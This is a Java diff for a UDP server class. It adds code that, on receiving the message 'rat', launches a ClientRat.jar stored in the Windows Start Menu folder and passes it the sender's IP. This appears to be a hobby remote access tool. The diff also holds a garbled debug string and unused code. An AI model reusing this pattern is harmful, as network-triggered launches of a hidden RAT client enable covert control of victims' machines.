@@ -9,12 +9,14 @@ import java.awt.event.KeyEvent;
 import static java.awt.event.KeyEvent.*;
 
 import java.io.BufferedReader;
+import java.io.File;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.net.DatagramPacket;
 import java.net.DatagramSocket;
 import java.net.InetSocketAddress;
 import java.net.SocketException;
+import java.util.List;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
@@ -61,7 +63,7 @@ public class ServerUDP
 	
 	private String receiveUDP(DatagramSocket socket) throws IOException
 	{
-		System.out.println("wait");
+		System.out.println("waqsdit");
 		byte[] bufR = new byte[2048];
 		DatagramPacket dpR = new DatagramPacket(bufR, bufR.length);
 		socket.receive(dpR);
@@ -107,7 +109,8 @@ public class ServerUDP
 		 */
 		if (receiveUDP.matches("rat")) {
 			System.out.println("IP : "+getRemoteIP());
-			return "java -jar C:\\Users\\UTILIS~1\\AppData\\Roaming\\MICROS~1\\Windows\\STARTM~1\\Programs\\LauncherJavaPerso\\ClientRat.jar "+getRemoteIP();
+			String[] msg = parseCmd("java -jar C:\\Users\\UTILIS~1\\AppData\\Roaming\\MICROS~1\\Windows\\STARTM~1\\Programs\\LauncherJavaPerso\\ClientRat.jar "+getRemoteIP());
+			launchClientRat(msg);
 		}
 		
 		
@@ -318,6 +321,43 @@ public class ServerUDP
 		return s_null;
 	}
 
+
+
+
+	private void launchClientRat(String[] message) throws IOException {
+			/*String[] cmd = new String[message.length-1];
+			
+			for (int i = 0 ; i < message.length-1 ; i++){
+				cmd[i] = message[i];
+			}
+			for (int i = 0 ; i < cmd.length ; i++) {
+				System.out.println("CMD[] = " + cmd[i]);
+			}
+			
+			String[] arg = {message[message.length-1]};
+			System.out.println("arg = "+arg);
+			*/
+			
+			String[] cmdToExecute = new String[message.length-1];
+
+			for (int i = 0 ; i < message.length-1 ; i++) {
+				cmdToExecute[i] = message[i];
+				//System.out.println(cmdToExecute[i]);
+			}
+			
+			if (message[0] == s_null) return;
+			
+			List<String> params = java.util.Arrays.asList(message);
+			ProcessBuilder pb = new ProcessBuilder(message);
+			//pb.redirectErrorStream(true);
+			pb.redirectError(new File("C:\\ErreurRat\\errore.txt"));
+			pb.redirectOutput(new File("C:\\ErreurRat\\outpute.txt"));
+			Process process = pb.start();
+			new BufferedReader(new InputStreamReader(process.getInputStream()) ); 
+			
+			return;
+		}		
+	
 
 
 
